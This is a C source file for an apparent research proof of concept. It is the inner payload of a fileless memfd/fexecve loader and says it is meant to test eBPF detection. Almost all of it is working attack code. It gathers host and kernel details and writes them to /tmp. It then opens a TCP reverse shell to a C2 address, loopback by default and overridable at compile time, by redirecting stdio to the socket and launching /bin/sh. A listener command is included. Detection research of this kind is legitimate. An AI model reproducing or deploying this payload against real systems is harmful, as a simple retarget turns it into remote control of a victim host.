/*
 * payload.c — Inner Payload (Reverse Shell + Exfiltration PoC)
 * ================================================================
 * This binary is NEVER written to disk. It is XOR-encoded inside
 * loader.c and executed directly from a memfd file descriptor via
 * fexecve(), leaving no on-disk ELF artifact.
 *
 * Execution sequence:
 *   1. Print banner (timestamp, PID, PPID) — proves fileless execution
 *   2. Read /etc/hostname — simulates data exfiltration (target recon)
 *   3. Print /proc/self/maps — proves /memfd: (deleted) backing
 *   4. Write all of the above to /tmp/containment_leak_PROOF.txt
 *   5. Open a TCP reverse shell back to C2_IP:C2_PORT
 *      → dup2 stdin/stdout/stderr to the socket
 *      → execve /bin/sh — attacker receives interactive shell
 *
 * Research context:
 *   Mimics real-world techniques seen in:
 *     - Ezuri Memory Loader (LevelBlue/SpiderLabs, 2021)
 *     - VoidLink Plugin Loader (Check Point Research, 2026)
 *     - MITRE ATT&CK T1027.002 (Obfuscated Files: Software Packing)
 *
 * Detection signals generated (Phase 4 eBPF targets):
 *   socket()    — TCP socket creation
 *   connect()   — outbound C2 connection
 *   dup2()      — fd redirect (stdin/stdout/stderr hijack)
 *   execve()    — shell spawn from fileless process
 *
 * Compile with:
 *   gcc -static -o payload_elf payload.c
 *   (static: no libc runtime deps when injected via fexecve)
 *
 * WARNING: FOR ACADEMIC/RESEARCH USE ONLY INSIDE AN ISOLATED VM.
 *          C2_IP is hardcoded to 127.0.0.1 (loopback only).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

/* ---------------------------------------------------------------------------
 * C2 configuration — overridable at compile time:
 *   make docker-shell  →  uses 172.17.0.1 (Docker bridge host gateway)
 *   make shell         →  uses 127.0.0.1  (bare-host loopback)
 * Run listener first: ncat -lvp 4444
 * --------------------------------------------------------------------------- */
#ifndef C2_IP
#define C2_IP   "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif

#define EXFIL_OUTPUT "/tmp/containment_leak_PROOF.txt"
#define SENTINEL     "[PAYLOAD] "

/* ---------------------------------------------------------------------------
 * Stage 1: Banner — proves fileless execution (timestamp, PID, PPID)
 * --------------------------------------------------------------------------- */
static void banner(FILE *out) {
    time_t t = time(NULL);
    char ts[64];
    struct tm tm_buf;
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%S", gmtime_r(&t, &tm_buf));

    fprintf(out,
        "=================================================================\n"
        SENTINEL "FILELESS PAYLOAD EXECUTION CONFIRMED\n"
        SENTINEL "Timestamp : %s UTC\n"
        SENTINEL "PID       : %d\n"
        SENTINEL "PPID      : %d\n"
        "=================================================================\n",
        ts, getpid(), getppid());
}

/* ---------------------------------------------------------------------------
 * Stage 2: Simulated reconnaissance — read /etc/hostname
 * In a real attack this would read /etc/passwd, SSH keys, cloud tokens, etc.
 * --------------------------------------------------------------------------- */
static void exfiltrate_hostname(FILE *out) {
    char buf[256] = {0};
    int fd = open("/etc/hostname", O_RDONLY);
    if (fd < 0) {
        fprintf(out, SENTINEL "Could not open /etc/hostname\n");
        return;
    }
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
        for (int i = 0; i < n; i++)
            if (buf[i] == '\n') buf[i] = '\0';
        fprintf(out, SENTINEL "TARGET HOSTNAME : %s\n", buf);
    }
}

/* ---------------------------------------------------------------------------
 * Stage 3: /proc/self/maps proof — shows /memfd: (deleted) backing
 * --------------------------------------------------------------------------- */
static void print_memory_map_proof(FILE *out) {
    fprintf(out, SENTINEL "--- /proc/self/maps (first 15 lines) ---\n");
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) {
        fprintf(out, SENTINEL "(could not open maps)\n");
        return;
    }
    char line[512];
    int count = 0;
    while (fgets(line, sizeof(line), maps) && count < 15) {
        if (strstr(line, "memfd") || strstr(line, "(deleted)"))
            fprintf(out, SENTINEL "[FILELESS] >> %s", line);
        else
            fprintf(out, "              %s", line);
        count++;
    }
    fclose(maps);
    fprintf(out, SENTINEL "--- end of maps ---\n");
}

/* Kernel info */
static void print_kernel_info(FILE *out) {
    struct utsname u;
    if (uname(&u) == 0)
        fprintf(out, SENTINEL "Kernel : %s %s %s\n", u.sysname, u.release, u.machine);
}

/* ---------------------------------------------------------------------------
 * Stage 4: TCP Reverse Shell
 *
 * Creates a TCP socket, connects to C2_IP:C2_PORT, redirects the three
 * standard file descriptors to the socket via dup2(), then spawns /bin/sh.
 * The attacker's nc listener receives an interactive shell.
 *
 * Syscalls generated (eBPF detection targets):
 *   socket(AF_INET, SOCK_STREAM, 0)          — creates TCP socket
 *   connect(sock, {C2_IP, C2_PORT}, ...)     — outbound C2 connection
 *   dup2(sock, 0/1/2)                        — hijacks stdio
 *   execve("/bin/sh", ["/bin/sh"], NULL)     — shell spawn
 * --------------------------------------------------------------------------- */
static void reverse_shell(void) {
    fprintf(stderr, SENTINEL "--- Initiating reverse shell to %s:%d ---\n",
            C2_IP, C2_PORT);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror(SENTINEL "socket");
        return;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(C2_PORT),
    };
    if (inet_pton(AF_INET, C2_IP, &addr.sin_addr) != 1) {
        fprintf(stderr, SENTINEL "inet_pton failed\n");
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror(SENTINEL "connect — is 'nc -lvp 4444' running?");
        close(sock);
        return;
    }

    fprintf(stderr, SENTINEL "Connected to %s:%d — redirecting stdio & spawning shell\n",
            C2_IP, C2_PORT);

    /* Redirect stdin (0), stdout (1), stderr (2) to socket */
    for (int i = 0; i < 3; i++) dup2(sock, i);
    close(sock);

    /* Spawn interactive shell — attacker now controls stdin/stdout */
    char *shell_argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", shell_argv, NULL);

    /* execve only returns on failure */
    perror(SENTINEL "execve /bin/sh");
}

/* ---------------------------------------------------------------------------
 * Main
 * --------------------------------------------------------------------------- */
int main(void) {
    /* --- Stages 1–3: collect and write proof output --- */
    FILE *out_file = fopen(EXFIL_OUTPUT, "w");
    if (out_file)
        fprintf(stderr, SENTINEL "Exfil proof file: %s\n", EXFIL_OUTPUT);
    else
        fprintf(stderr, SENTINEL "[WARN] Could not open proof file: %s (%s)\n",
                EXFIL_OUTPUT, strerror(errno));

    FILE *streams[2] = {stdout, out_file};

    for (int s = 0; s < 2; s++) {
        FILE *out = streams[s];
        if (!out) continue;

        banner(out);
        exfiltrate_hostname(out);
        print_kernel_info(out);
        print_memory_map_proof(out);

        fprintf(out,
            "=================================================================\n"
            SENTINEL "HYPOTHESIS CONFIRMED: Payload executed with NO on-disk ELF.\n"
            SENTINEL "Static scanners cannot detect this. Use eBPF/strace to catch\n"
            SENTINEL "the memfd_create + fexecve syscall chain.\n"
            "=================================================================\n");

        if (out != stdout) fflush(out);
    }

    if (out_file) fclose(out_file);

    /* --- Stage 4: Open reverse shell back to C2 --- */
    reverse_shell();

    return 0;
}
